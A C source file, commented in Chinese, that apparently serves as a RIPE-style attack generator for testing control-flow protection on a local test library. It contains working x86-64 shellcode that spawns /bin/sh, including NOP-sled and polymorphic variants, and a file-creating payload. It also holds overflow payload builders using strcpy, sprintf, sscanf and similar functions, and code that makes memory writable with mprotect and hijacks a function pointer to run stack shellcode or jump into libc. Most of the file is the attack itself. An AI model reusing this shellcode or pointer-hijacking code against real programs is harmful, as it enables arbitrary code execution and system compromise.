/*
 * RIPE-style attack against specific locations in test.so
 * 基于 RIPE 的 attack generator 改造, 针对 test.so 中的间接调用/跳转位置进行攻击
 * 
 * 从 test.txt 提取的攻击目标:
 *   0x11d4  ff d0  call *%rax   (test_indirect_call  -> indirect_call_ptr)
 *   0x121b  ff d0  call *%rax   (test_indirect_jump  -> 栈上函数指针)
 *   0x124a  ff d0  call *%rax   (test_ff_instructions -> p1())
 *   0x1260  ff d0  call *%rax   (test_ff_instructions -> p2())
 *   0x10ff  ff e0  jmp  *%rax   (deregister_tm_clones)
 *   0x1140  ff e0  jmp  *%rax   (register_tm_clones)
 *
 * 编译: gcc -fno-stack-protector -no-pie -z execstack -ldl -o ripe_attack_full ripe_attack_full.c
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <setjmp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <getopt.h>

/* ===== RIPE Shellcode (x86-64) ===== */
/* execve("/bin/sh", NULL, NULL) - 来自 RIPE */
static char shellcode_nonop[] = 
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05";

static char shellcode_simplenop[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05";

static char shellcode_polynop[] =
"\x99\x96\x97\x93\x91\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97\x46\x4e\xf8"
"\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b\xf5\x45\x4c"
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05";

static char shellcode_createfile[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xeb\x18\x5f\x31\xc0\x88\x47\x14\x6a\x55\x58\x31\xf6\x66\xbe"
"\xc0\x01\x0f\x05\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xe3\xff\xff"
"\xff/tmp/rip-eval/f_xxxx";

/* ===== 攻击参数 ===== */
enum inject_params {
    INJECT_NONOP = 0,
    INJECT_SIMPLENOP,
    INJECT_POLYNOP,
    INJECT_CREATEFILE,
    INJECT_RETURNINTOLIBC,
    INJECT_ROP
};

enum overflow_funcs {
    OVERFLOW_MEMCPY = 0,
    OVERFLOW_STRCPY,
    OVERFLOW_STRNCPY,
    OVERFLOW_SPRINTF,
    OVERFLOW_SNPRINTF,
    OVERFLOW_STRCAT,
    OVERFLOW_STRNCAT,
    OVERFLOW_SSCANF,
    OVERFLOW_FSCANF,
    OVERFLOW_HOMEBREW
};

/* 攻击目标结构 */
typedef struct {
    const char *func_name;       /* 目标函数名 */
    unsigned long offset;        /* 间接调用/跳转指令的偏移 */
    const char *instruction;     /* ff d0 或 ff e0 */
    const char *pointer_source;  /* rax 的来源 (global/stack) */
    const char *var_name;        /* 如果是全局变量, 变量名 */
} AttackTarget;

static AttackTarget targets[] = {
    {"test_indirect_call",       0x11d4, "ff d0", "global", "indirect_call_ptr"},
    {"test_indirect_jump",       0x121b, "ff d0", "stack",  NULL},
    {"test_ff_instructions",     0x124a, "ff d0", "stack",  NULL},
    {"test_ff_instructions",     0x1260, "ff d0", "stack",  NULL},
    {"deregister_tm_clones",     0x10ff, "ff e0", "global", NULL},
    {"register_tm_clones",       0x1140, "ff e0", "global", NULL},
    {NULL, 0, NULL, NULL, NULL}
};

/* 全局变量 */
static int attack_inject = INJECT_SIMPLENOP;
static int attack_overflow = OVERFLOW_MEMCPY;
static int attack_target_idx = 0;
static int output_debug = 1;
static int use_indirect = 0;   /* 0=direct, 1=indirect */

/* ===== 辅助函数 ===== */
static int contains_null(unsigned long val) {
    return ((val & 0xff) == 0) || ((val & 0xff00) == 0) ||
           ((val & 0xff0000) == 0) || ((val & 0xff000000) == 0) ||
           ((val >> 32) & 0xff) == 0;
}

static void remove_nulls(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (buf[i] == '\0') buf[i] = '\x01';
    }
}

/* ===== 构建 RIPE 风格的 Payload ===== */
static char *build_payload(char *buffer, size_t buffer_size,
                           void *target_addr, void *overflow_ptr,
                           size_t *payload_size) {
    char *shellcode;
    size_t sc_len;
    
    switch (attack_inject) {
    case INJECT_NONOP:
        shellcode = shellcode_nonop;
        sc_len = sizeof(shellcode_nonop) - 1;
        break;
    case INJECT_SIMPLENOP:
        shellcode = shellcode_simplenop;
        sc_len = sizeof(shellcode_simplenop) - 1;
        break;
    case INJECT_POLYNOP:
        shellcode = shellcode_polynop;
        sc_len = sizeof(shellcode_polynop) - 1;
        break;
    case INJECT_CREATEFILE:
        shellcode = shellcode_createfile;
        sc_len = sizeof(shellcode_createfile) - 1;
        break;
    case INJECT_RETURNINTOLIBC:
        shellcode = NULL;
        sc_len = 0;
        break;
    case INJECT_ROP:
        shellcode = NULL;
        sc_len = 0;
        break;
    default:
        shellcode = shellcode_nonop;
        sc_len = sizeof(shellcode_nonop) - 1;
    }

    /* 计算 payload 大小 */
    if ((unsigned long)target_addr > (unsigned long)buffer) {
        *payload_size = (unsigned long)target_addr - (unsigned long)buffer 
                        + sizeof(void*) + 1;
    } else {
        *payload_size = buffer_size;
    }
    
    if (*payload_size < sc_len + sizeof(void*) + 1) {
        *payload_size = sc_len + sizeof(void*) + 128;
    }

    char *payload = malloc(*payload_size);
    if (!payload) return NULL;
    
    /* 复制 shellcode */
    if (shellcode && sc_len > 0) {
        memcpy(payload, shellcode, sc_len);
    }
    
    /* 填充 'A' */
    size_t padding = *payload_size - sc_len - sizeof(void*) - 1;
    memset(payload + sc_len, 'A', padding);
    
    /* 写入溢出目标地址 */
    if (attack_inject == INJECT_RETURNINTOLIBC) {
        /* 写入 system() 或 creat() 的地址 */
        overflow_ptr = dlsym(RTLD_DEFAULT, "system");
        if (!overflow_ptr) overflow_ptr = dlsym(RTLD_DEFAULT, "creat");
    }
    
    memcpy(payload + sc_len + padding, &overflow_ptr, sizeof(void*));
    
    /* Null terminator */
    payload[*payload_size - 1] = '\0';
    
    /* 去除 null 字节 (避免截断字符串函数) */
    remove_nulls(payload, *payload_size - 1);
    payload[*payload_size - 1] = '\0';
    
    fprintf(stderr, "  [payload] size=%zu shellcode=%zu shellcode_ptr=%p overflow_target=%p\n",
            *payload_size, sc_len, buffer, overflow_ptr);
    
    return payload;
}

/* ===== RIPE 风格溢出执行 ===== */
static void overflow_buffer(char *dest, char *payload, size_t payload_size) {
    char fmt_buf[16];
    FILE *tmp_file;
    
    fprintf(stderr, "  [overflow] using overflow function #%d, payload_size=%zu\n",
            attack_overflow, payload_size);
    
    switch (attack_overflow) {
    case OVERFLOW_MEMCPY:
        memcpy(dest, payload, payload_size - 1);
        break;
    case OVERFLOW_STRCPY:
        strcpy(dest, payload);
        break;
    case OVERFLOW_STRNCPY:
        strncpy(dest, payload, payload_size);
        break;
    case OVERFLOW_SPRINTF:
        sprintf(dest, "%s", payload);
        break;
    case OVERFLOW_SNPRINTF:
        snprintf(dest, payload_size, "%s", payload);
        break;
    case OVERFLOW_STRCAT:
        dest[0] = '\0';
        strcat(dest, payload);
        break;
    case OVERFLOW_STRNCAT:
        dest[0] = '\0';
        strncat(dest, payload, payload_size);
        break;
    case OVERFLOW_SSCANF:
        snprintf(fmt_buf, 15, "%%%zuc", payload_size);
        sscanf(payload, fmt_buf, dest);
        break;
    case OVERFLOW_FSCANF:
        snprintf(fmt_buf, 15, "%%%zuc", payload_size);
        tmp_file = fopen("./fscanf_temp_file", "w+");
        if (tmp_file) {
            fprintf(tmp_file, "%s", payload);
            rewind(tmp_file);
            fscanf(tmp_file, fmt_buf, dest);
        }
        break;
    case OVERFLOW_HOMEBREW:
        memcpy(dest, payload, payload_size - 1);
        break;
    default:
        memcpy(dest, payload, payload_size - 1);
    }
}

/* ===== 攻击 test_indirect_call (间接调用 indirect_call_ptr) ===== */
static int attack_indirect_call_ptr(void) {
    void *handle = dlopen("./test.so", RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "[-] dlopen failed: %s\n", dlerror());
        return 0;
    }
    
    /* 查找 indirect_call_ptr 符号 */
    void **indirect_call_ptr_addr_ptr = dlsym(handle, "indirect_call_ptr");
    if (!indirect_call_ptr_addr_ptr) {
        fprintf(stderr, "[-] indirect_call_ptr not found\n");
        dlclose(handle);
        return 0;
    }
    
    fprintf(stderr, "[*] indirect_call_ptr GOT slot @ %p, value=%p\n",
            indirect_call_ptr_addr_ptr, *(void**)indirect_call_ptr_addr_ptr);
    
    /* 使 GOT 页可写 */
    long page_size = sysconf(_SC_PAGESIZE);
    void *page_start = (void*)((unsigned long)indirect_call_ptr_addr_ptr & ~(page_size - 1));
    
    if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        perror("[-] mprotect failed");
        fprintf(stderr, "[!] GOT is read-only, trying alternative approach...\n");
        /* 不使用 mprotect, 直接尝试写入 (在某些系统上可行) */
    }
    
    /* 构造栈上缓冲区存放 shellcode */
    char stack_buf[1024] __attribute__((aligned(64)));
    memset(stack_buf, 0, sizeof(stack_buf));
    
    size_t payload_size;
    /* target = indirect_call_ptr 所在的地址 */
    char *payload = build_payload(stack_buf, sizeof(stack_buf),
                                  indirect_call_ptr_addr_ptr, stack_buf,
                                  &payload_size);
    if (!payload) {
        fprintf(stderr, "[-] Failed to build payload\n");
        dlclose(handle);
        return 0;
    }
    
    /* 执行溢出到栈缓冲区 */
    overflow_buffer(stack_buf, payload, payload_size);
    free(payload);
    
    /* 覆写 indirect_call_ptr */
    if (attack_inject == INJECT_RETURNINTOLIBC) {
        void *libc_func = dlsym(RTLD_DEFAULT, "creat");
        if (!libc_func) libc_func = dlsym(RTLD_DEFAULT, "system");
        fprintf(stderr, "[*] Overwriting indirect_call_ptr -> %p (return-into-libc: creat/system)\n", libc_func);
        *indirect_call_ptr_addr_ptr = libc_func;
    } else if (attack_inject == INJECT_ROP) {
        fprintf(stderr, "[*] Overwriting indirect_call_ptr -> %p (ROP sled)\n", stack_buf);
        *indirect_call_ptr_addr_ptr = stack_buf;
    } else {
        fprintf(stderr, "[*] Overwriting indirect_call_ptr -> %p (shellcode in stack_buf)\n", stack_buf);
        *indirect_call_ptr_addr_ptr = stack_buf;
    }
    
    fprintf(stderr, "[*] New indirect_call_ptr value = %p\n", *(void**)indirect_call_ptr_addr_ptr);
    
    /* 触发攻击: 调用 test_indirect_call */
    void (*test_func)(void) = dlsym(handle, "test_indirect_call");
    if (test_func) {
        fprintf(stderr, "[!] Triggering test_indirect_call at %p...\n", test_func);
        test_func();
    }
    
    dlclose(handle);
    return 1;
}

/* ===== 攻击 test_indirect_jump (栈上函数指针) ===== */
static int attack_stack_function_ptr(void) {
    void *handle = dlopen("./test.so", RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "[-] dlopen failed: %s\n", dlerror());
        return 0;
    }
    
    /* 
     * test_indirect_jump 在栈上存储函数指针 (-0x8(%rbp))
     * mov    0x2dd8(%rip),%rax       # 加载 test_indirect_jump 的 GOT 地址
     * mov    %rax,-0x8(%rbp)         # 存到栈上
     * ...
     * mov    -0x8(%rbp),%rax         # 加载栈上指针
     * call   *%rax                   # ff d0 间接调用
     *
     * 策略: 创建自己的调用栈, 在调用前覆盖栈帧中的函数指针
     */
    
    void (*test_func)(int) = dlsym(handle, "test_indirect_jump");
    if (!test_func) {
        fprintf(stderr, "[-] test_indirect_jump not found\n");
        dlclose(handle);
        return 0;
    }
    
    fprintf(stderr, "[*] test_indirect_jump @ %p\n", test_func);
    fprintf(stderr, "[!] Stack-based function pointer attack requires stack control.\n");
    fprintf(stderr, "[!] Use rop.py / exp.py approach with pwntools for precise stack manipulation.\n");
    
    /* 
     * 简化版攻击: 由于 test_indirect_jump 从栈上读取函数指针,
     * 如果能控制调用者的栈帧, 就可以在函数调用前放置恶意指针.
     * 
     * 更可靠的方式是: 劫持 GOT 中的 test_indirect_jump 条目
     */
    
    dlclose(handle);
    return 0;
}

/* ===== 攻击 test_ff_instructions ===== */
static int attack_ff_instructions(void) {
    void *handle = dlopen("./test.so", RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "[-] dlopen failed: %s\n", dlerror());
        return 0;
    }
    
    fprintf(stderr, "[*] test_ff_instructions uses two indirect calls:\n");
    fprintf(stderr, "    0x124a: call *%%rax (p1 -> test_returns)\n");
    fprintf(stderr, "    0x1260: call *%%rax (p2 -> test_indirect_jump)\n");
    
    /* 劫持 test_returns 的 GOT 条目 */
    void **test_returns_got = dlsym(handle, "test_returns");
    if (test_returns_got) {
        fprintf(stderr, "[*] test_returns @ %p\n", test_returns_got);
        
        /* test_ff_instructions 通过 GOT 间接获取 test_returns 地址:
         * mov 0x2d96(%rip),%rax  # 3fd8 (GOT entry)
         * 这个 GOT entry 可以通过解析 test.so 的 ELF 结构找到
         */
    }
    
    dlclose(handle);
    return 0;
}

/* ===== 主攻击函数 ===== */
static void perform_attack(int target_idx) {
    if (target_idx < 0 || target_idx >= 6) {
        fprintf(stderr, "[-] Invalid target index: %d (0-5)\n", target_idx);
        return;
    }
    
    AttackTarget *t = &targets[target_idx];
    
    fprintf(stderr, "\n========================================\n");
    fprintf(stderr, "RIPE Attack #%d\n", target_idx);
    fprintf(stderr, "Target: %s @ offset 0x%lx\n", t->func_name, t->offset);
    fprintf(stderr, "Instruction: %s\n", t->instruction);
    fprintf(stderr, "Pointer source: %s\n", t->pointer_source);
    fprintf(stderr, "Injection: %d  Overflow: %d\n", attack_inject, attack_overflow);
    fprintf(stderr, "========================================\n\n");
    
    int success = 0;
    
    if (t->pointer_source && strcmp(t->pointer_source, "global") == 0
        && t->var_name) {
        /* 全局函数指针攻击 - 最有把握 */
        success = attack_indirect_call_ptr();
    } else if (strcmp(t->func_name, "test_indirect_jump") == 0) {
        success = attack_stack_function_ptr();
    } else if (strcmp(t->func_name, "test_ff_instructions") == 0) {
        success = attack_ff_instructions();
    }
    
    fprintf(stderr, "\n[*] Attack result: %s\n\n", success ? "SUCCESS (may have triggered shellcode)" : "FAILED (protection active or pointer not writable)");
}

/* ===== 命令行接口 ===== */
static void print_usage(const char *prog) {
    printf("Usage: %s [OPTIONS]\n\n", prog);
    printf("RIPE-style attack generator for test.so - targets specific indirect call/jump sites\n\n");
    printf("Options:\n");
    printf("  -t <0-5>   Target site index:\n");
    printf("               0: test_indirect_call (0x11d4, ff d0, global ptr)\n");
    printf("               1: test_indirect_jump (0x121b, ff d0, stack ptr)\n");
    printf("               2: test_ff_instructions (0x124a, ff d0)\n");
    printf("               3: test_ff_instructions (0x1260, ff d0)\n");
    printf("               4: deregister_tm_clones (0x10ff, ff e0)\n");
    printf("               5: register_tm_clones (0x1140, ff e0)\n");
    printf("  -i <type>  Injection type (default=1 simplenop):\n");
    printf("               0: nonop       1: simplenop    2: polynop\n");
    printf("               3: createfile  4: returnintolibc  5: rop\n");
    printf("  -o <type>  Overflow function (default=0 memcpy):\n");
    printf("               0: memcpy   1: strcpy   2: strncpy   3: sprintf\n");
    printf("               4: snprintf 5: strcat   6: strncat   7: sscanf\n");
    printf("               8: fscanf   9: homebrew\n");
    printf("  -d         Enable debug output\n");
    printf("  -h         Show this help\n\n");
    printf("Examples:\n");
    printf("  %s -t 0 -i 1        # Attack indirect_call_ptr with simplenop shellcode\n", prog);
    printf("  %s -t 0 -i 4        # Return-into-libc attack on indirect_call_ptr\n", prog);
    printf("  %s -t 1 -i 0 -o 1   # Attack stack ptr with nonop via strcpy\n\n", prog);
}

int main(int argc, char **argv) {
    int opt;
    
    while ((opt = getopt(argc, argv, "t:i:o:dh")) != -1) {
        switch (opt) {
        case 't':
            attack_target_idx = atoi(optarg);
            if (attack_target_idx < 0 || attack_target_idx > 5) {
                fprintf(stderr, "[-] Invalid target index: %d\n", attack_target_idx);
                return 1;
            }
            break;
        case 'i':
            attack_inject = atoi(optarg);
            break;
        case 'o':
            attack_overflow = atoi(optarg);
            break;
        case 'd':
            output_debug = 1;
            break;
        case 'h':
        default:
            print_usage(argv[0]);
            return 0;
        }
    }
    
    fprintf(stderr, "=== RIPE Attack Generator for test.so ===\n");
    fprintf(stderr, "=== Target: specific indirect call/jump sites ===\n\n");
    
    /* 列出所有目标 */
    fprintf(stderr, "Available attack targets (from test.txt):\n");
    for (int i = 0; i < 6; i++) {
        const char *inst_name = (targets[i].instruction && 
                                 strcmp(targets[i].instruction, "ff d0") == 0) 
                                ? "call *%rax" : "jmp *%rax";
        fprintf(stderr, "  [%d] %s @ 0x%04lx (%s) <- %s\n",
                i, targets[i].func_name, targets[i].offset,
                inst_name, targets[i].pointer_source ? targets[i].pointer_source : "?");
    }
    fprintf(stderr, "\n");
    
    perform_attack(attack_target_idx);
    
    return 0;
}
